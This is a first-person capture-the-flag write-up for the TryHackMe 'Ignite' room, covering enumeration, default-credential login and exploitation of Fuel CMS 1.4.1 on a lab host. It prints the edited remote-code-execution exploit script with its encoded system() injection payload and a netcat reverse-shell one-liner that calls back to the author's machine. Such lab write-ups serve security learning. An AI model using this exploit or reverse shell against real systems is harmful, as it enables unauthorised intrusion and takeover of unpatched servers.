@@ -1,0 +1,171 @@
+This is a write up for the tryhackme room ignite
+
+Root the box! Designed and created by DarkStar7471, built by Paradox.
+
+Looks like a fun room I'm keep to dive into.
+
+There are two things we need to find the user flag and the root flag so all pretty standard stuff.
+
+The general layout of my writeups is some text of my thoughts and then the command. If the IP I'm attacking changes don't worry it means that I took a break and came back another time. Also I don't delete mistakes I make so if I take a wrong path I will leave it in the write up and explain why it's wrong.
+
+To start things off lets run an NMAP scan 
+
+nmap -sS -sV -A 10.10.216.148
+
+These are my preferred tags to start with, give me a lot of info that I find useful
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 19:44 SAST
+Nmap scan report for 10.10.216.148
+Host is up (0.15s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to FUEL CMS
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=5/6%OT=80%CT=1%CU=36699%PV=Y%DS=2%DC=T%G=Y%TM=60942B04
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ(
+OS:SP=105%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3
+OS:=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=6
+OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   154.24 ms 10.9.0.1
+2   154.60 ms 10.10.216.148
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.37 seconds
+
+1 port open it seems to be a website also there is a robots.txt file that could be interesting. The description talked about a webapp so this is expected. Notably there is no ssh picked up.
+
+So I took a look at the website we can see that they're using fuel CMS 1.4. I personally have never heard of it, but interestingly its on GitHub and is open source. So I'm willing to bet there's an exploit that we can find for it.
+
+While I was looking at the web page I ran a GoBuster scan to see what's there
+
+gobuster dir -u http://10.10.216.148:80 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.216.148:80
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/06 19:47:06 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 292]
+/.htpasswd            (Status: 403) [Size: 297]
+/@                    (Status: 400) [Size: 1134]
+/.htaccess            (Status: 403) [Size: 297] 
+/0                    (Status: 200) [Size: 16603]
+/assets               (Status: 301) [Size: 315] [--> http://10.10.216.148/assets/]
+/home                 (Status: 200) [Size: 16603]                                 
+/index                (Status: 200) [Size: 16603]                                 
+/index.php            (Status: 200) [Size: 16603]                                 
+/lost+found           (Status: 400) [Size: 1134]                                  
+/offline              (Status: 200) [Size: 70]                                    
+/robots.txt           (Status: 200) [Size: 30]                                    
+/server-status        (Status: 403) [Size: 301]                                   
+                                                                                  
+===============================================================
+2021/05/06 19:48:26 Finished
+===============================================================
+
+
+Okay there's also some interesting files. The first thing I'm going to do is look at the files for two reasons. I may not need an exploit to gain access and I find having an understanding of the file structure makes finding and using exploits far easier.
+
+robots.txt
+
+User-agent: *
+Disallow: /fuel/
+
+looking at /fuel/ redirects us to a login page. Now its important to note that gobuster did not pick up the fuel page because it probably isn't in the common.txt. So while I look at exploits I'll run the big.txt file through gobuster.
+
+And everything else complaing about special characters or lack of access or redirecting to the home pages means that it's time to go look for an exploit.
+
+searchsploit Fuel CMS
+--------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                   |  Path
+--------------------------------------------------------------------------------- ---------------------------------
+fuel CMS 1.4.1 - Remote Code Execution (1)                                       | linux/webapps/47138.py
+Fuel CMS 1.4.1 - Remote Code Execution (2)                                       | php/webapps/49487.rb
+Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                             | php/webapps/48741.txt
+Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                 | php/webapps/48778.txt
+--------------------------------------------------------------------------------- ---------------------------------
+
+Anyway we're attacking a web app AND THERE'S A SQL INJECTION PROOF OF CONCEPT. you know what that means: time for burp
+
+And I just got the biggest let down of in hacking. I was prepped for some fun SQL injection play around but as a general rule I test basic I-don't-change-defaults username:password combos like admin:password ecetera and one of them let me in. (letmein is also a password I try). 
+	If you can't guess it go look at what the defaults for this service is or go have fun with burp.
+
+Although we don't actually need access to use RCE (1) It's always better to have more access. And there's a reason to read all exploits and not get excited by SQL injection.
+
+Also now I have a route to RCE with a exploit and a viable path I'm cancelling the gobuster big.txt search. It gots about halfway and found a lot but nothing super interesting.
+
+So I downloaded the Exploit and moved it into the folder I'm using for this hack and changes the IP in the code to the IP of the machine I'm hacking and ran it.
+
+python2 47138.py
+
+now we have a shell into the machine we can go looking for flags.
+	
+I actually struggled quite a bit with the net part. You need to edit the exploit script because we aren't running it through burp and set up a connection with a nc on your own machine
+
+url = "http://10.0.0.117"
+def find_nth_overlapping(haystack, needle, n):
+    start = haystack.find(needle)
+    while start >= 0 and n > 1:
+        start = haystack.find(needle, start+1)
+        n -= 1
+    return start
+
+while 1:
+	xxxx = raw_input('cmd:')
+	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
+	#proxy = {"http":"http://127.0.0.1:8080"}
+	r = requests.get(burp0_url)
+
+So the edited script should look like it does above
+
+and then we use
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.64 1234 >/tmp/f
+
+To get a reverse shell to connect to our netcat.
+
+Cool once your in cd ../.. all the way out then navigate into home/www-data and the first flag is there.
+
+sudo -l wasn't working for escalation so I'm going to look through the files see what I can find.
+
+Anyway so I found the password in a databse with the following path /var/www/html/fuel/application/config/database.php
+
+I don't know if there is an easier way to find things, I was tired but it got found. So we can use the password in the .php file to su to root and get the root flag
+
+And I got cock blocked again with su must be run from a terminal. Though at least this is an easy fix as literally the first google result gave me the commands I need to do that.
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python /tmp/asdf.py
+
+su root
+Password: ******
+
+and Now I'm root and can go find the flag.
+
+
+This was a fun room but there was a large amount of annoyance that was generated with the python script editing and getting nc to get a reverse shell.
+
+This jsut means that I need to get more practice so I can recognise and fix these types of things much faster and with minimal annoyance.
